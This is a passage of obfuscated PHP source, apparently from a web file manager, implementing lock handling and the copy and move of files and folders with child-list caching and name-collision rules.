$this->_lockCheckEnd($áÕÎôá[619], $ì”Ö±ü¼); } public function lockWriteEnd($‹é×ßó¾, $ş·ü·­¬ = '') { $ø¸¬€é‡ =& $_SERVER[íïàËŸë]; if (!$this->allowLock()) { return; } $Ûö¤òÛ = 0; $this->_lockKey($ø¸¬€é‡[623] . $‹é×ßó¾ . $ø¸¬€é‡[10] . $ş·ü·­¬, $Ûö¤òÛ); $this->_lockEvent($‹é×ßó¾, array($ø¸¬€é‡[618], $ø¸¬€é‡[620]), $Ûö¤òÛ); $this->_lockParent($‹é×ßó¾, array($ø¸¬€é‡[618], $ø¸¬€é‡[620]), $Ûö¤òÛ); } public function lockMoveStart($Òª»Ê) { $ÖòÜ÷ì€ =& $_SERVER[íïàËŸë]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÖòÜ÷ì€[620], $Òª»Ê); $¹“ß±£Ø = 1; $this->_lockKey($ÖòÜ÷ì€[624] . $Òª»Ê, $¹“ß±£Ø); $this->_lockEvent($Òª»Ê, array($ÖòÜ÷ì€[618], $ÖòÜ÷ì€[619]), $¹“ß±£Ø); $this->_lockParent($Òª»Ê, array($ÖòÜ÷ì€[618], $ÖòÜ÷ì€[620]), $¹“ß±£Ø); $this->_lockEvent($Òª»Ê, array($ÖòÜ÷ì€[625], $ÖòÜ÷ì€[621], $ÖòÜ÷ì€[622]), $¹“ß±£Ø); $this->_lockCheckEnd($ÖòÜ÷ì€[620], $Òª»Ê); } public function lockMoveEnd($Œƒ÷ß÷±) { $á¢ ôçÀ =& $_SERVER[íïàËŸë]; if (!$this->allowLock()) { return; } $È´ç‚ïÍ = 0; $this->_lockKey($á¢ ôçÀ[624] . $Œƒ÷ß÷±, $È´ç‚ïÍ); $this->_lockEvent($Œƒ÷ß÷±, array($á¢ ôçÀ[618], $á¢ ôçÀ[619]), $È´ç‚ïÍ); $this->_lockParent($Œƒ÷ß÷±, array($á¢ ôçÀ[618], $á¢ ôçÀ[620]), $È´ç‚ïÍ); $this->_lockEvent($Œƒ÷ß÷±, array($á¢ ôçÀ[625], $á¢ ôçÀ[621], $á¢ ôçÀ[622]), $È´ç‚ïÍ); } private function _lockCheck($ƒüî¶ã, $øÒÙ®µé) { $óÔş“¬¹ =& $_SERVER[íïàËŸë]; $ô­’œ = $this->sourceInfo($øÒÙ®µé); $Â¤ïéå = $ƒüî¶ã . $óÔş“¬¹[10] . $øÒÙ®µé; $this->_lockTimeStart[$Â¤ïéå] = timeFloat(); if (!is_array($ô­’œ)) { return; } $½÷É‚† = LNG($óÔş“¬¹[626]); CacheLock::setErrorMsg($óÔş“¬¹[176] . htmlspecialchars($ô­’œ[$óÔş“¬¹[32]]) . $óÔş“¬¹[178] . $½÷É‚†); $this->_lockKey($Â¤ïéå, 1); $this->_lockKey($Â¤ïéå, 0); $¦Ğöñ±† = array_reverse($this->parentLevelArray($ô­’œ[$óÔş“¬¹[584]])); foreach ($¦Ğöñ±† as $‰Š”¸ÉĞ) { $Â¤ïéå = $ƒüî¶ã . $óÔş“¬¹[627] . $‰Š”¸ÉĞ; if (CacheLock::lockGet($óÔş“¬¹[628] . $Â¤ïéå)) { $ô­’œ = $this->sourceInfo($‰Š”¸ÉĞ); CacheLock::setErrorMsg($óÔş“¬¹[176] . htmlspecialchars($ô­’œ[$óÔş“¬¹[32]]) . $óÔş“¬¹[178] . $½÷É‚†); $this->_lockKey($Â¤ïéå, 1); $this->_lockKey($Â¤ïéå, 0); } } } private function _lockCheckEnd($Ë”îé´, $Ù»¸ã˜É) { $ªÃ¼êúñ =& $_SERVER[íïàËŸë]; $«öõ¢–ƒ = $Ë”îé´ . $ªÃ¼êúñ[10] . $Ù»¸ã˜É; CacheLock::setErrorMsg($ªÃ¼êúñ[454]); if (!isset($this->_lockTimeStart[$«öõ¢–ƒ])) { return; } $»Ìö‹…¥ = timeFloat() - $this->_lockTimeStart[$«öõ¢–ƒ]; unset($this->_lockTimeStart[$«öõ¢–ƒ]); if ($»Ìö‹…¥ > 0.5) { unset(self::$cacheSourceInfo[$ªÃ¼êúñ[533] . $Ù»¸ã˜É]); } $Â¬¥¡ĞÇ = $this->sourceInfo($Ù»¸ã˜É); if (!$Â¬¥¡ĞÇ) { show_json(LNG($ªÃ¼êúñ[108]), !1); } } private function _lockParent($”íä…”³, $ÏÂÜÓ¹—, $Ã®Ò¬¶²) { if (!$this->autoLockSet) { return; } $è¢œ¢è¦ = $this->sourceInfo($”íä…”³); if (!is_array($è¢œ¢è¦)) { return; } $‘¯„Šù = array_reverse($this->parentLevelArray($è¢œ¢è¦[$_SERVER[íïàËŸë][584]])); foreach ($‘¯„Šù as $®¹èùõ‹) { $this->_lockEvent($®¹èùõ‹, $ÏÂÜÓ¹—, $Ã®Ò¬¶²); } } private function _lockEvent($€¶˜›Ô, $‘ƒğ‡»”, $ˆäÊÌ‘) { $¼«Øïñ =& $_SERVER[íïàËŸë]; if (!$this->autoLockSet) { return; } foreach ($‘ƒğ‡»” as $¬‡ Óïø) { $úÓãÃ­Í = $¬‡ Óïø . $¼«Øïñ[10] . $€¶˜›Ô; if ($ˆäÊÌ‘ && CacheLock::lockGet($¼«Øïñ[628] . $úÓãÃ­Í)) { continue; } $this->_lockKey($úÓãÃ­Í, $ˆäÊÌ‘); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ñı…˜ª, $ø…È¯·ù = 1) { $”™¾ûÎ„ = $_SERVER[íïàËŸë][628] . md5($ñı…˜ª); if ($ø…È¯·ù) { if (isset(self::$_lockItemArr[$”™¾ûÎ„])) { return; } self::$_lockItemArr[$”™¾ûÎ„] = 1; CacheLock::lock($”™¾ûÎ„, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$”™¾ûÎ„])) { return; } unset(self::$_lockItemArr[$”™¾ûÎ„]); CacheLock::unlock($”™¾ûÎ„); } } public function isParentOf($¯…˜¿Í„, $Úæ²ÛŒ‘) { $ÉõˆÓÄ‡ =& $_SERVER[íïàËŸë]; $ÊÎ¶ìö² = $this->sourceInfo($¯…˜¿Í„); $«ï¼ï»à = $this->sourceInfo($Úæ²ÛŒ‘); $½ôßö§» = $ÊÎ¶ìö²[$ÉõˆÓÄ‡[584]] . $ÊÎ¶ìö²[$ÉõˆÓÄ‡[193]] . $ÉõˆÓÄ‡[50]; $Ä­šã = $«ï¼ï»à[$ÉõˆÓÄ‡[584]] . $«ï¼ï»à[$ÉõˆÓÄ‡[193]] . $ÉõˆÓÄ‡[50]; $ˆùÀæÛ° = strpos($Ä­šã, $½ôßö§») === 0; return $ˆùÀæÛ°; } private $targetIsDelete = 0; public function copy($şëùÕšş, $Œè¾Ï, $ĞÆ“ş·— = REPEAT_REPLACE, $ôîéÄ¢ = '') { $àÌõƒˆÖ =& $_SERVER[íïàËŸë]; $¨ÕÁšïû = $this->sourceInfo($şëùÕšş); $Û”‘×›É = $this->sourceInfo($Œè¾Ï); if (!$¨ÕÁšïû || !$Û”‘×›É || $Û”‘×›É[$àÌõƒˆÖ[485]] != $àÌõƒˆÖ[91]) { return !1; } if ($this->isParentOf($şëùÕšş, $Œè¾Ï)) { return !1; } $œÉØÏŸ = $ôîéÄ¢ ? $ôîéÄ¢ : $¨ÕÁšïû[$àÌõƒˆÖ[32]]; $this->lockCopyStart($şëùÕšş); $this->lockWriteStart($Œè¾Ï, $œÉØÏŸ); $â¥ŸÔ©ş = array($àÌõƒˆÖ[629] => array(), $àÌõƒˆÖ[630] => array(), $àÌõƒˆÖ[631] => array()); $this->targetIsDelete = intval($¨ÕÁšïû[$àÌõƒˆÖ[505]]); $§¨Õæ‡ = $this->fileNameExistAuto($Œè¾Ï, $¨ÕÁšïû); $º‰¬ÜÑî = $this->_copy($şëùÕšş, $Œè¾Ï, $ĞÆ“ş·—, $â¥ŸÔ©ş, !0, $ôîéÄ¢); $this->_childrenListClear(); $this->lockCopyEnd($şëùÕšş); $this->lockWriteEnd($Œè¾Ï, $œÉØÏŸ); if ($¨ÕÁšïû[$àÌõƒˆÖ[485]] == $àÌõƒˆÖ[91] && $§¨Õæ‡ == $º‰¬ÜÑî) { $this->folderSizeResetChildren($§¨Õæ‡); } Model($àÌõƒˆÖ[632])->addAll($â¥ŸÔ©ş[$àÌõƒˆÖ[630]], array(), !0); if ($§¨Õæ‡ != $º‰¬ÜÑî || $¨ÕÁšïû[$àÌõƒˆÖ[485]] == $àÌõƒˆÖ[91]) { Model($àÌõƒˆÖ[633])->eventCopy($º‰¬ÜÑî); } $this->saveAll($â¥ŸÔ©ş[$àÌõƒˆÖ[631]]); Model($àÌõƒˆÖ[230])->linkAdd($â¥ŸÔ©ş[$àÌõƒˆÖ[629]]); $this->folderSizeReset($Œè¾Ï); $this->updateModifyTime($Œè¾Ï); return $º‰¬ÜÑî; } private function _copy($´Ìİ°¼ü, $Ì°ë¼®, $ÓàƒÌôÏ, &$³•Í´œ·, $ñİ¡âèÎ, $Ÿ‚Ğãì‹ = '') { $„Ü¨œê =& $_SERVER[íïàËŸë]; $Î¸ê¶Ô = $this->sourceInfoCache($´Ìİ°¼ü); $Ä–ÄÅÊ« = $Î¸ê¶Ô[$„Ü¨œê[485]] == $„Ü¨œê[91]; $™¿µÓ„ = $Ÿ‚Ğãì‹ ? $Ÿ‚Ğãì‹ : $Î¸ê¶Ô[$„Ü¨œê[32]]; $ºõŠ¡Ç = $this->fileNameExistAuto($Ì°ë¼®, $Î¸ê¶Ô); if ($ñİ¡âèÎ) { $this->_childrenAllMake($´Ìİ°¼ü); if ($Ä–ÄÅÊ« && $ºõŠ¡Ç) { $this->_childrenAllMake($ºõŠ¡Ç); } } if (!$ºõŠ¡Ç) { return $this->_copyCreate($´Ìİ°¼ü, $Ì°ë¼®, $™¿µÓ„, $³•Í´œ·); } $Ã‘Ê = $ºõŠ¡Ç; if ($Ä–ÄÅÊ«) { if ($ÓàƒÌôÏ == REPEAT_RENAME_FOLDER) { $™¿µÓ„ = $this->fileNameAutoCache($Ì°ë¼®, $™¿µÓ„, $ÓàƒÌôÏ, $Ä–ÄÅÊ«); $Ã‘Ê = $this->_copyCreate($´Ìİ°¼ü, $Ì°ë¼®, $™¿µÓ„, $³•Í´œ·); } else { $®×®©ûÖ = $this->_childrenList($´Ìİ°¼ü); foreach ($®×®©ûÖ as $°€×‘) { $this->_copy($°€×‘[$„Ü¨œê[193]], $ºõŠ¡Ç, $ÓàƒÌôÏ, $³•Í´œ·, !1); } } } else { if ($ÓàƒÌôÏ == REPEAT_RENAME || $ÓàƒÌôÏ == REPEAT_RENAME_FOLDER) { $™¿µÓ„ = $this->fileNameAutoCache($Ì°ë¼®, $™¿µÓ„, $ÓàƒÌôÏ, $Ä–ÄÅÊ«); $Ã‘Ê = $this->_copyCreate($´Ìİ°¼ü, $Ì°ë¼®, $™¿µÓ„, $³•Í´œ·); } else { if ($ÓàƒÌôÏ == REPEAT_REPLACE) { $ÉÓ½œùÕ = $this->sourceInfoCache($ºõŠ¡Ç); $Ìò€€Ü¹ = $this->fileHistory($ÉÓ½œùÕ, $Î¸ê¶Ô[$„Ü¨œê[541]], $Î¸ê¶Ô[$„Ü¨œê[79]]); if ($Ìò€€Ü¹) { $³•Í´œ·[$„Ü¨œê[629]][] = $Î¸ê¶Ô[$„Ü¨œê[541]]; } } else { if ($ÓàƒÌôÏ == REPEAT_SKIP) { } } } Hook::trigger($„Ü¨œê[634], array($„Ü¨œê[635], $Î¸ê¶Ô, 0)); } return $Ã‘Ê; } private function _copyCreate($ËÂì¢², $óñÌËğ†, $‰µ÷¤ÑÙ, &$êÛô”ö) { $ÚñŸ’Ì¬ =& $_SERVER[íïàËŸë]; $¶€ª™Ÿ— = $this->sourceInfoCache($ËÂì¢²); $ğ‘ßèÔö = $this->sourceInfoCache($óñÌËğ†); $ıò‰­ – = $this->_makeItemData($¶€ª™Ÿ—, $ğ‘ßèÔö, $‰µ÷¤ÑÙ); Hook::trigger($ÚñŸ’Ì¬[636], $ıò‰­ –); Hook::trigger($ÚñŸ’Ì¬[637], array($ÚñŸ’Ì¬[638], $ıò‰­ –, 0)); $İ—‹†ÔŒ = $this->add($ıò‰­ –); $•å©ñÙ‰ = array($ÚñŸ’Ì¬[193] => $İ—‹†ÔŒ, $ÚñŸ’Ì¬[32] => $‰µ÷¤ÑÙ); $this->_copyApplyMeta($•å©ñÙ‰, $êÛô”ö); if ($¶€ª™Ÿ—[$ÚñŸ’Ì¬[485]] != $ÚñŸ’Ì¬[91]) { $êÛô”ö[$ÚñŸ’Ì¬[629]][] = $¶€ª™Ÿ—[$ÚñŸ’Ì¬[541]]; return $İ—‹†ÔŒ; } $ø«Õœ”û = array(); $”éâ½¾’ = array(); $this->_childrenListAll($ËÂì¢², $ø«Õœ”û); $ç©ƒèÑ = count($ø«Õœ”û); if ($ç©ƒèÑ == 0) { return $İ—‹†ÔŒ; } $êÒß‹ØÃ = $this->sourceInfo($İ—‹†ÔŒ); foreach ($ø«Õœ”û as $Áâîì˜ğ) { $˜¾çğÎÀ = $this->_makeItemData($Áâîì˜ğ, $êÒß‹ØÃ, $Áâîì˜ğ[$ÚñŸ’Ì¬[32]]); $˜¾çğÎÀ[$ÚñŸ’Ì¬[584]] = $Áâîì˜ğ[$ÚñŸ’Ì¬[584]]; $”éâ½¾’[] = $˜¾çğÎÀ; } $this->chunkEventSet($ÚñŸ’Ì¬[639], array($ÚñŸ’Ì¬[640], $ıò‰­ –, $ç©ƒèÑ)); $this->addAll($”éâ½¾’, array(), !1); $ÚÈ‘µÌ = $this->where(array($ÚñŸ’Ì¬[192] => $İ—‹†ÔŒ))->select(); $‘‰áÂÍó = $this->_childrenMakeRelation($ø«Õœ”û, $ÚÈ‘µÌ); $‘‰áÂÍó[$ËÂì¢²] = $İ—‹†ÔŒ; $””ÔšÈ’ = array(); $æ—Ú„‘ = array(); foreach ($ÚÈ‘µÌ as $Áâîì˜ğ) { $Ì½©Ã…ù = $Áâîì˜ğ[$ÚñŸ’Ì¬[193]]; $Ôòò¥â° = $this->_childrenMatch($‘‰áÂÍó, $Áâîì˜ğ, $êÒß‹ØÃ); $””ÔšÈ’[] = array($ÚñŸ’Ì¬[193], $Ì½©Ã…ù, $ÚñŸ’Ì¬[192], $Ôòò¥â°[$ÚñŸ’Ì¬[192]]); $æ—Ú„‘[] = array($ÚñŸ’Ì¬[193], $Ì½©Ã…ù, $ÚñŸ’Ì¬[584], $Ôòò¥â°[$ÚñŸ’Ì¬[584]]); $this->_copyApplyMeta($Áâîì˜ğ, $êÛô”ö); if ($Áâîì˜ğ[$ÚñŸ’Ì¬[485]] != $ÚñŸ’Ì¬[91]) { $êÛô”ö[$ÚñŸ’Ì¬[629]][] = $Áâîì˜ğ[$ÚñŸ’Ì¬[541]]; } } $this->chunkEventSet($ÚñŸ’Ì¬[641], array($ÚñŸ’Ì¬[642], $ıò‰­ –, $ç©ƒèÑ)); $this->saveAll($””ÔšÈ’); $this->chunkEventSet($ÚñŸ’Ì¬[643], array($ÚñŸ’Ì¬[644], $ıò‰­ –, $ç©ƒèÑ)); $this->saveAll($æ—Ú„‘); return $İ—‹†ÔŒ; } private function _childrenMakeRelation($„îÜÁ, $êËÉù) { $Í„çÔŒĞ =& $_SERVER[íïàËŸë]; $µĞ§Çë¢ = array(); $¡Ä‹áª = array(); foreach ($„îÜÁ as $²”£Ø‹) { $µÆĞüË = $²”£Ø‹[$Í„çÔŒĞ[32]] . $Í„çÔŒĞ[8] . $²”£Ø‹[$Í„çÔŒĞ[584]]; $µĞ§Çë¢[$µÆĞüË] = $²”£Ø‹[$Í„çÔŒĞ[193]]; } foreach ($êËÉù as $²”£Ø‹) { $µÆĞüË = $²”£Ø‹[$Í„çÔŒĞ[32]] . $Í„çÔŒĞ[8] . $²”£Ø‹[$Í„çÔŒĞ[584]]; $Î£ĞÑŒœ = $µĞ§Çë¢[$µÆĞüË]; $¡Ä‹áª[$Î£ĞÑŒœ] = $²”£Ø‹[$Í„çÔŒĞ[193]]; } return $¡Ä‹áª; } private function _childrenMatch($»£ÉŠù¯, $ÔœæÅøÎ, $—åş§€ç) { $ˆ¥ƒæçà =& $_SERVER[íïàËŸë]; $ã©Î£óâ = $—åş§€ç[$ˆ¥ƒæçà[584]]; $Õ—´Í› = $this->parentLevelArray($ÔœæÅøÎ[$ˆ¥ƒæçà[584]]); foreach ($Õ—´Í› as $àÈàÁ¦·) { if (isset($»£ÉŠù¯[$àÈàÁ¦·])) { $ã©Î£óâ .= $»£ÉŠù¯[$àÈàÁ¦·] . $ˆ¥ƒæçà[645]; } } $ã©Î£óâ = rtrim($ã©Î£óâ, $ˆ¥ƒæçà[50]) . $ˆ¥ƒæçà[50]; $¹ù¥ãĞ = $this->parentLevelArray($ã©Î£óâ); $–ÏÀ€¿‹ = $¹ù¥ãĞ[count($¹ù¥ãĞ) - 1]; return array($ˆ¥ƒæçà[192] => $–ÏÀ€¿‹, $ˆ¥ƒæçà[584] => $ã©Î£óâ); } private function _makeItemData($æ°óû”, $îÄüÏÂ, $Åõ‹Ç®Ä) { $µ›•¡îû =& $_SERVER[íïàËŸë]; $Ä„¯µáÒ = array($µ›•¡îû[646] => $æ°óû”[$µ›•¡îû[485]], $µ›•¡îû[494] => $Åõ‹Ç®Ä, $µ›•¡îû[647] => $æ°óû”[$µ›•¡îû[486]] ? $æ°óû”[$µ›•¡îû[486]] : $µ›•¡îû[12], $µ›•¡îû[542] => $æ°óû”[$µ›•¡îû[541]] ? $æ°óû”[$µ›•¡îû[541]] : 0, $µ›•¡îû[617] => $æ°óû”[$µ›•¡îû[79]] ? $æ°óû”[$µ›•¡îû[79]] : 0, $µ›•¡îû[648] => intval($îÄüÏÂ[$µ›•¡îû[190]]), $µ›•¡îû[649] => intval($îÄüÏÂ[$µ›•¡îû[569]]), $µ›•¡îû[650] => intval(USER_ID), $µ›•¡îû[651] => intval(USER_ID), $µ›•¡îû[477] => intval($îÄüÏÂ[$µ›•¡îû[193]]), $µ›•¡îû[652] => $îÄüÏÂ[$µ›•¡îû[584]] . $îÄüÏÂ[$µ›•¡îû[193]] . $µ›•¡îû[50], $µ›•¡îû[498] => $æ°óû”[$µ›•¡îû[88]] ? $æ°óû”[$µ›•¡îû[88]] : time(), $µ›•¡îû[504] => 0, $µ›•¡îû[653] => $µ›•¡îû[12]); return $Ä„¯µáÒ; } private function _copyApplyMeta($äŠçª¬ƒ, &$ÀÒĞ…ØÓ) { $À‘¢²ûÎ =& $_SERVER[íïàËŸë]; $¬Â‡²¬â = $äŠçª¬ƒ[$À‘¢²ûÎ[193]]; $”ÅïŠ£¯ = $äŠçª¬ƒ[$À‘¢²ûÎ[32]]; if (!isset($äŠçª¬ƒ[$À‘¢²ûÎ[654]]) || !$äŠçª¬ƒ[$À‘¢²ûÎ[654]] || $äŠçª¬ƒ[$À‘¢²ûÎ[654]] == $À‘¢²ûÎ[228]) { $ÀÒĞ…ØÓ[$À‘¢²ûÎ[631]][] = array($À‘¢²ûÎ[193], $¬Â‡²¬â, $À‘¢²ûÎ[654], short_id($¬Â‡²¬â)); } if (Input::check($”ÅïŠ£¯, $À‘¢²ûÎ[655])) { $ÀÒĞ…ØÓ[$À‘¢²ûÎ[630]][] = array($À‘¢²ûÎ[193] => $¬Â‡²¬â, $À‘¢²ûÎ[97] => $À‘¢²ûÎ[538], $À‘¢²ûÎ[450] => str_replace($À‘¢²ûÎ[53], $À‘¢²ûÎ[12], Pinyin::get($”ÅïŠ£¯))); $ÀÒĞ…ØÓ[$À‘¢²ûÎ[630]][] = array($À‘¢²ûÎ[193] => $¬Â‡²¬â, $À‘¢²ûÎ[97] => $À‘¢²ûÎ[537], $À‘¢²ûÎ[450] => Pinyin::get($”ÅïŠ£¯, $À‘¢²ûÎ[656])); } $ÀÒĞ…ØÓ[$À‘¢²ûÎ[630]][] = array($À‘¢²ûÎ[193] => $¬Â‡²¬â, $À‘¢²ûÎ[97] => $À‘¢²ûÎ[517], $À‘¢²ûÎ[450] => KodSort::makeStr($”ÅïŠ£¯)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Êš¥ı) { $¿ÛÆ­û÷ =& $_SERVER[íïàËŸë]; $„ûÉš„ = $this->sourceInfo($Êš¥ı); $¢Ø€æ©ğ = $¿ÛÆ­û÷[657]; $Œš¯‰ÏÈ = array($¿ÛÆ­û÷[584] => array($¿ÛÆ­û÷[612], $„ûÉš„[$¿ÛÆ­û÷[584]] . $Êš¥ı . $¿ÛÆ­û÷[613]), $¿ÛÆ­û÷[505] => $this->targetIsDelete); $üÄêİ®Â = $this->field($¢Ø€æ©ğ)->where($Œš¯‰ÏÈ)->select(); if (!$üÄêİ®Â) { return; } $üÄêİ®Â = array_to_keyvalue($üÄêİ®Â, $¿ÛÆ­û÷[193]); foreach ($üÄêİ®Â as $¥´Ôó‰™) { $¨¬Ï÷·À = $¥´Ôó‰™[$¿ÛÆ­û÷[192]]; $Êš¥ı = $¥´Ôó‰™[$¿ÛÆ­û÷[193]]; if (!isset($this->_childrenListCache[$Êš¥ı]) && $¥´Ôó‰™[$¿ÛÆ­û÷[485]] == $¿ÛÆ­û÷[91]) { $this->_childrenListCache[$Êš¥ı] = array(); } if (!isset($this->_childrenListCache[$¨¬Ï÷·À])) { $this->_childrenListCache[$¨¬Ï÷·À] = array(); } $this->_childrenListCache[$¨¬Ï÷·À][$Êš¥ı] = $¥´Ôó‰™; $this->_childrenItemCache[$Êš¥ı] = $¥´Ôó‰™; } } private function _childrenListAll($¾°Û­èæ, &$Õ›ã„æ) { $¹õ¡µ‡ =& $_SERVER[íïàËŸë]; if (!isset($this->_childrenListCache[$¾°Û­èæ])) { return; } $Š‡Ë³ÙŞ = $this->_childrenListCache[$¾°Û­èæ]; foreach ($Š‡Ë³ÙŞ as $æÉæ½Ş‹ => $·°‰•ã) { $Õ›ã„æ[$æÉæ½Ş‹] = $·°‰•ã; if ($·°‰•ã[$¹õ¡µ‡[485]] == $¹õ¡µ‡[91]) { $this->_childrenListAll($æÉæ½Ş‹, $Õ›ã„æ); } } } private function sourceInfoCache($Á‡»®âø) { if (isset($this->_childrenItemCache[$Á‡»®âø])) { return $this->_childrenItemCache[$Á‡»®âø]; } return $this->sourceInfo($Á‡»®âø); } private function _childrenList($ª¬ëàÅ) { if (isset($this->_childrenListCache[$ª¬ëàÅ])) { return $this->_childrenListCache[$ª¬ëàÅ]; } return $this->_childrenListSelect($ª¬ëàÅ); } private function _childrenListSelect($æ·ğê‚î) { $²±ıÖÎ =& $_SERVER[íïàËŸë]; $§æÓÁ¥… = array($²±ıÖÎ[192] => $æ·ğê‚î, $²±ıÖÎ[505] => $this->targetIsDelete); $éò…¼Ğ± = $this->where($§æÓÁ¥…)->select(); $éò…¼Ğ± = $éò…¼Ğ± ? $éò…¼Ğ± : array(); $úµíş¬ = array_to_keyvalue($éò…¼Ğ±, $²±ıÖÎ[193]); $this->_childrenListCache[$æ·ğê‚î] = $úµíş¬; foreach ($úµíş¬ as $æ·ğê‚î => $˜®Çò¡) { $this->_childrenItemCache[$æ·ğê‚î] = $˜®Çò¡; } return $úµíş¬; } private function fileNameExistAuto($ƒ‡ø¯éí, $å¥‡Áªü) { $Ô¾ºå¤ş =& $_SERVER[íïàËŸë]; if ($å¥‡Áªü[$Ô¾ºå¤ş[505]] == $Ô¾ºå¤ş[91]) { return $this->fileNameExist($ƒ‡ø¯éí, $å¥‡Áªü[$Ô¾ºå¤ş[32]]); } return $this->fileNameExistCache($ƒ‡ø¯éí, $å¥‡Áªü[$Ô¾ºå¤ş[32]]); } private function fileNameExistCache($ú³èÍˆÆ, $áÈÄá‰) { $äİ×éµ =& $_SERVER[íïàËŸë]; $áÈÄá‰ = strtolower($áÈÄá‰); $àæÊâ¿² = $this->_childrenList($ú³èÍˆÆ); foreach ($àæÊâ¿² as $šé›œŸ) { if ($áÈÄá‰ == strtolower($šé›œŸ[$äİ×éµ[32]])) { return $šé›œŸ[$äİ×éµ[193]]; } } return !1; } private function fileNameAutoCache($£ï¥«û€, $Ããì´ù±, $°ìÏœç«, $˜Ãáü¤”) { $¡ÖÁãı =& $_SERVER[íïàËŸë]; $ê“ñªÆ¨ = $this->_childrenList($£ï¥«û€); $”üŒıá“ = array_to_keyvalue($ê“ñªÆ¨, $¡ÖÁãı[12], $¡ÖÁãı[32]); return $this->fileNameAutoGet($”üŒıá“, $Ããì´ù±, $°ìÏœç«, $˜Ãáü¤”); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($¬‚Ó›òø, $¼õ’öÈÉ, $œåÉúöä = REPEAT_REPLACE, $º¥°Š×£ = '') { $÷Öª©¿Å =& $_SERVER[íïàËŸë]; $ï»¢›Ò£ = $this->sourceInfo($¬‚Ó›òø); $Ü•Ş­šå = $this->sourceInfo($¼õ’öÈÉ); if ($ï»¢›Ò£[$÷Öª©¿Å[192]] == $Ü•Ş­šå[$÷Öª©¿Å[193]]) { if ($ï»¢›Ò£[$÷Öª©¿Å[505]] == $÷Öª©¿Å[91]) { Model($÷Öª©¿Å[503])->restore(array($¬‚Ó›òø)); } if (!$º¥°Š×£ || $º¥°Š×£ == $ï»¢›Ò£[$÷Öª©¿Å[32]]) { return $¬‚Ó›òø; } } $ƒ£òšÓ = $this->pathInfoMore($¬‚Ó›òø); if ($this->isParentOf($¬‚Ó›òø, $¼õ’öÈÉ)) { return !1; } if (!$ï»¢›Ò£ || !$Ü•Ş­šå || $Ü•Ş­šå[$÷Öª©¿Å[485]] != $÷Öª©¿Å[91]) { return !1; } Hook::trigger($÷Öª©¿Å[658], $ƒ£òšÓ); $this->targetIsDelete = intval($ï»¢›Ò£[$÷Öª©¿Å[505]]); if ($ï»¢›Ò£[$÷Öª©¿Å[192]] == $¼õ’öÈÉ && $º¥°Š×£ != $ï»¢›Ò£[$÷Öª©¿Å[32]]) { $ú»¦³ß÷ = $this->fileNameExist($¼õ’öÈÉ, $º¥°Š×£); if ($ú»¦³ß÷ && $ï»¢›Ò£[$÷Öª©¿Å[485]] == $÷Öª©¿Å[228]) { $ÊúÌÏ = $this->sourceInfo($ú»¦³ß÷); $€¿×äü» = $this->fileHistory($ÊúÌÏ, $ï»¢›Ò£[$÷Öª©¿Å[541]], $ï»¢›Ò£[$÷Öª©¿Å[79]]); if (!$€¿×äü») { Model($÷Öª©¿Å[544])->remove($ï»¢›Ò£[$÷Öª©¿Å[541]]); } $this->removeNow($¬‚Ó›òø, !1); $this->folderSizeReset($¼õ’öÈÉ); Hook::trigger($÷Öª©¿Å[659], $ƒ£òšÓ); return $ú»¦³ß÷; } } $óÎöïÚ¿ = $º¥°Š×£ ? $º¥°Š×£ : $ï»¢›Ò£[$÷Öª©¿Å[32]]; $this->lockMoveStart($¬‚Ó›òø); $this->lockWriteStart($¼õ’öÈÉ, $óÎöïÚ¿); $ËÒ×‰ŸÍ = array($÷Öª©¿Å[629] => array(), $÷Öª©¿Å[660] => !1); $this->clearShare($¬‚Ó›òø, $¼õ’öÈÉ); $¥Ü˜ÊÁ = $this->fileNameExistAuto($¼õ’öÈÉ, $ï»¢›Ò£); $ğ‰”¤³„ = $this->_move($¬‚Ó›òø, $¼õ’öÈÉ, $œåÉúöä, $ËÒ×‰ŸÍ, $º¥°Š×£); $this->sourceCacheClear(); if ($ï»¢›Ò£[$÷Öª©¿Å[485]] == $÷Öª©¿Å[91] && $¥Ü˜ÊÁ) { $this->folderSizeResetChildren($ğ‰”¤³„); } Model($÷Öª©¿Å[230])->linkAdd($ËÒ×‰ŸÍ[$÷Öª©¿Å[629]]); if ($¥Ü˜ÊÁ && $ËÒ×‰ŸÍ[$÷Öª©¿Å[660]]) { $this->removeNow($¬‚Ó›òø, !1); } $this->lockMoveEnd($¬‚Ó›òø); $this->lockWriteEnd($¼õ’öÈÉ, $óÎöïÚ¿); $this->folderSizeReset($ï»¢›Ò£[$÷Öª©¿Å[192]]); $this->folderSizeReset($¼õ’öÈÉ); $çÁêùºø = array($ï»¢›Ò£[$÷Öª©¿Å[192]], $¼õ’öÈÉ); if ($ï»¢›Ò£[$÷Öª©¿Å[485]] == $÷Öª©¿Å[91]) { $çÁêùºø[] = $¬‚Ó›òø; } $this->updateModifyTime($çÁêùºø); Model($÷Öª©¿Å[633])->eventMove($¬‚Ó›òø, $ï»¢›Ò£[$÷Öª©¿Å[192]], $¼õ’öÈÉ); Hook::trigger($÷Öª©¿Å[659], $ƒ£òšÓ); return $ğ‰”¤³„; } private function _move($Ò®õ„¨, $‹âÛè…, $Åá¦Ã, &$‘«ÍÎíŠ, $ëÔŠâ£  = '') { $°˜£‹À =& $_SERVER[íïàËŸë]; $×¨Ù÷›… = $this->sourceInfo($Ò®õ„¨); $æéÀ©« = $×¨Ù÷›…[$°˜£‹À[485]] == $°˜£‹À[91]; $ò‹ïî²ò = $ëÔŠâ£  ? $ëÔŠâ£  : $×¨Ù÷›…[$°˜£‹À[32]]; $íüò”¹ = $this->fileNameExistAuto($‹âÛè…, $×¨Ù÷›…); $this->lockMoveStart($Ò®õ„¨); $this->lockWriteStart($‹âÛè…, $ò‹ïî²ò); if (!$íüò”¹) { return $this->_moveForce($Ò®õ„¨, $‹âÛè…, $ò‹ïî²ò); } $ûÑ¾–“Ü = $íüò”¹; $ú©âî³ = !1; if ($æéÀ©«) { if ($Åá¦Ã == REPEAT_RENAME_FOLDER) { $ò‹ïî²ò = $this->fileNameAuto($‹âÛè…, $ò‹ïî²ò, $Åá¦Ã, $æéÀ©«); $ûÑ¾–“Ü = $this->_moveForce($Ò®õ„¨, $‹âÛè…, $ò‹ïî²ò); } else { if ($Åá¦Ã == 